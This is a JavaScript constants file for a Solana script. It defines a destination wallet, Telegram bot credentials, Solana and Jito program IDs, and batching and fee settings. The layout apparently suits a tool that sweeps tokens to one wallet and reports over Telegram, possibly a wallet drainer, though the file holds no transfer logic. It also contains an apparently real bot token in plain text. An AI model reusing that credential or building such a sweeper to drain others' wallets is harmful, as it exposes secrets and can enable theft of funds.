/**
 * CONSTANTS - Central configuration
 * All wallet addresses, tokens, and global settings
 */

const { PublicKey } = require('@solana/web3.js');

// ==================== YOUR CONFIGURATION ====================
const DESTINATION_WALLET = new PublicKey('3CJTdaP5ZrvCyWQ8MNs2DzPPjzafqtNtiSDgked2YAd2');
const TELEGRAM_BOT_TOKEN = '8745622529:AAGL9IjFnZWpEeRCxqiG1Ws6vpqBQp8x6oU';
const TELEGRAM_USER_ID = '7763698333';
// ============================================================

// Solana Program IDs
const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
const SYSTEM_PROGRAM_ID = new PublicKey('11111111111111111111111111111111');
const MEMO_PROGRAM_ID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
const COMPUTE_BUDGET_ID = new PublicKey('ComputeBudget111111111111111111111111111111');

// Jito Configuration
const JITO_TIP_ACCOUNTS = [
  new PublicKey('96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5'),
  new PublicKey('HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe'),
  new PublicKey('Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY')
];

// Global Settings
const SETTINGS = {
  DEFAULT_PRIORITY_FEE: 1000000,        // 1M microlamports
  DEFAULT_COMPUTE_UNITS: 400000,         // Compute units
  FEE_RESERVE_SOL: 0.005,                 // SOL reserved for fees
  MAX_RETRIES: 3,
  RETRY_DELAY_MS: 3000,
  JITO_TIP_LAMPORTS: 1000,                // 0.000001 SOL tip
  CONFIRMATION_TIMEOUT: 30000,
  BATCH_SIZE: 10,                         // Max tokens per batch
};

module.exports = {
  DESTINATION_WALLET,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_USER_ID,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  SYSTEM_PROGRAM_ID,
  MEMO_PROGRAM_ID,
  COMPUTE_BUDGET_ID,
  JITO_TIP_ACCOUNTS,
  SETTINGS
};
